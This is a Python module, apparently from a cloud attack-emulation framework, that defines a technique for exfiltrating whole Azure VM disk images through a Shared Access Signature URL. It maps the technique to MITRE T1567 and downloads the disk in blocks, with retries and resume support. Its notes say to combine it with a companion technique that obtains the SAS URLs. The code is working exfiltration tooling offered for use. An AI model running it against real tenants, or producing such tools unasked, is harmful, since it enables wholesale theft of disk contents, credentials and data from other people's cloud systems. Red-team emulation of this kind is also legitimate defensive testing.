from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import os
import datetime
import requests
import time
import json

@TechniqueRegistry.register
class AzureExfilVMDisk(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1567",
                technique_name="Exfiltration Over Web Service",
                tactics=["Exfiltration"],
                sub_technique_name= None
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT604",
                technique_name="Virtual Machine Data Access",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        technique_notes = [
            TechniqueNote("Combine with AzureShareVmDisk to obtain SAS URLs"),
            TechniqueNote("Use smaller block sizes on memory-constrained systems"),
            TechniqueNote("Increase timeout for slower network connections"),
            TechniqueNote("Use technique resume capability for dailed large disk downloads"),
            TechniqueNote("Ensure the provide valid SAS URL with at least read permissions for the target disk"),
            TechniqueNote("Exfil data can be extremely large, make sure there is sufficient storage space for the disk image")
        ]
        technique_refs = [
            TechniqueReference("Grant limited access to Azure Storage resources using shared access signatures (SAS)", "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview"),
            TechniqueReference("Azure Disk | Exfiltrate VM Disk", "https://zigmax.net/azure-disk-exfiltrate-vm-disk/")
        ]
        super().__init__(
            "Exfil VM Disk Data", 
            "Exfiltrates Azure VM disk contents using a Shared Access Signature (SAS) URL. This technique supports large disk downloads with resume capability, handles network interruptions with configurable retries, implements block-based downloading to manage memory usage, maintains download state for recovery from failures and rovides detailed progress tracking and completion percentage. Note: Ensure there",
            mitre_techniques,
            azure_trm_technique,
            references=technique_refs,
            notes=technique_notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            sas_url: str = kwargs.get("sas_url")
            block_size: int = kwargs.get("block_size", 4*1024*1024)  # Default 4MB blocks
            download_timeout: int = kwargs.get("download_timeout", 300)  # 5 min timeout
            max_retries: int = kwargs.get("max_retries", 3)
            resume_file: str = kwargs.get("resume_file", None)
            
            # Input validation
            if not sas_url or not isinstance(sas_url, str):
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid SAS URL",
                    "message": "A valid SAS URL is required"
                }

            # Validate numeric parameters
            try:
                block_size = int(block_size) if block_size else 4*1024*1024
                if download_timeout:
                    download_timeout = int(download_timeout)
                else:
                    download_timeout = 300 #Default
                
                if max_retries:
                    max_retries = int(max_retries)
                else:
                    max_retries = 3 #Default
                
                if block_size <= 0:
                    block_size = 4*1024*1024
                if download_timeout <= 0:
                    download_timeout = 300
                if max_retries <= 0:
                    max_retries = 3
            except (ValueError, TypeError):
                block_size = 4*1024*1024
                download_timeout = 300
                max_retries = 3

            # Create download directory
            dt_stamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            download_path = f"./output/azure_vm_disk_download/{str(dt_stamp)}"
            os.makedirs(download_path, exist_ok=True)

            # Initialize session with retry configuration
            session = requests.Session()
            session.mount('https://', requests.adapters.HTTPAdapter(max_retries=max_retries))

            # Get disk metadata
            try:
                head_response = session.head(sas_url, timeout=30)
                head_response.raise_for_status()
                total_size = int(head_response.headers.get('Content-Length', 0))
            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": f"Failed to get disk metadata: {str(e)}",
                    "message": "Check SAS URL validity and permissions"
                }

            if total_size == 0:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid disk size",
                    "message": "Disk appears to be empty or inaccessible"
                }

            # Calculate blocks
            total_blocks = (total_size + block_size - 1) // block_size
            downloaded_size = 0
            current_block = 0

            # Load resume data if exists
            resume_info = {}
            resume_file_path = os.path.join(download_path, "resume_info.json")
            
            if resume_file and os.path.exists(resume_file):
                try:
                    with open(resume_file, 'r') as f:
                        resume_info = json.load(f)
                        current_block = resume_info.get('last_block', 0)
                        downloaded_size = resume_info.get('downloaded_size', 0)
                except Exception:
                    current_block = 0
                    downloaded_size = 0

            download_file = os.path.join(download_path, "vm_disk.vhd")
            file_mode = 'ab' if current_block > 0 else 'wb'

            try:
                with open(download_file, file_mode) as f:
                    for block_num in range(current_block, total_blocks):
                        retries = 0
                        while retries < max_retries:
                            try:
                                start_byte = block_num * block_size
                                end_byte = min(start_byte + block_size - 1, total_size - 1)
                                headers = {'Range': f'bytes={start_byte}-{end_byte}'}
                                
                                response = session.get(sas_url, headers=headers, timeout=download_timeout)
                                response.raise_for_status()
                                
                                f.write(response.content)
                                downloaded_size += len(response.content)
                                
                                # Save resume information
                                resume_info = {
                                    'last_block': block_num + 1,
                                    'downloaded_size': downloaded_size,
                                    'total_size': total_size,
                                    'block_size': block_size,
                                    'timestamp': datetime.datetime.now().isoformat()
                                }
                                with open(resume_file_path, 'w') as rf:
                                    json.dump(resume_info, rf)
                                
                                break  # Success, move to next block
                            
                            except requests.exceptions.Timeout:
                                retries += 1
                                if retries == max_retries:
                                    return ExecutionStatus.PARTIAL_SUCCESS, {
                                        "message": f"Download timed out at block {block_num}",
                                        "value": {
                                            "download_path": download_path,
                                            "resume_file": resume_file_path,
                                            "downloaded_size_bytes": downloaded_size,
                                            "total_size_bytes": total_size,
                                            "last_block": block_num,
                                            "blocks_remaining": total_blocks - block_num,
                                            "completion_percentage": (downloaded_size/total_size)*100
                                        }
                                    }
                                time.sleep(2 ** retries)  # Exponential backoff
                            
                            except Exception as e:
                                retries += 1
                                if retries == max_retries:
                                    raise e
                                time.sleep(2 ** retries)

                # Download completed successfully
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully downloaded VM disk data",
                    "value": {
                        "download_path": download_path,
                        "file_name": "vm_disk.vhd",
                        "total_size_bytes": total_size,
                        "downloaded_size_bytes": downloaded_size,
                        "blocks_downloaded": total_blocks,
                        "block_size_bytes": block_size,
                        "completion_percentage": 100
                    }
                }

            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to download VM disk data",
                    "value": {
                        "download_path": download_path,
                        "resume_file": resume_file_path,
                        "downloaded_size_bytes": downloaded_size,
                        "total_size_bytes": total_size,
                        "last_block": current_block,
                        "blocks_remaining": total_blocks - current_block,
                        "completion_percentage": (downloaded_size/total_size)*100 if total_size > 0 else 0
                    }
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to download VM disk data"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "sas_url": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "VM Disk SAS URL",
                "input_field_type": "text"
            },
            "block_size": {
                "type": "int", 
                "required": False,
                "default": 4*1024*1024,  # 4MB
                "name": "Download Block Size (bytes)",
                "input_field_type": "number"
            },
            "download_timeout": {
                "type": "int",
                "required": False,
                "default": 300,  # 5 minutes
                "name": "Download Timeout (seconds)",
                "input_field_type": "number"
            },
            "max_retries": {
                "type": "int",
                "required": False,
                "default": 3,
                "name": "Max Retries per Block",
                "input_field_type": "number"
            },
            "resume_file": {
                "type": "str",
                "required": False,
                "default": None,
                "name": "Resume File Path",
                "input_field_type": "text"
            }
        }